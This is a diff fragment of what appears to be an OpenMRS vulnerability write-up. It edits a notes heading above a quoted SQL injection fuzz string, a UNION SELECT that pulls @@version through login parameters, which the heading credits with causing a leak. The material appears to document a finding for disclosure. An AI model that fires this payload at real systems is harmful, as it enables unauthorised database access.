@@ -78,7 +78,7 @@ OpenMRS should still be operating normally
 
 ### * NOTES:
 
-FUZZ STRING USED
+FUZZ STRING USED TO CAUSE THE LEAK
 > ' union (select NULL, (select @@version)) --&sessionLocation=2&redirectUrl=
 
 or
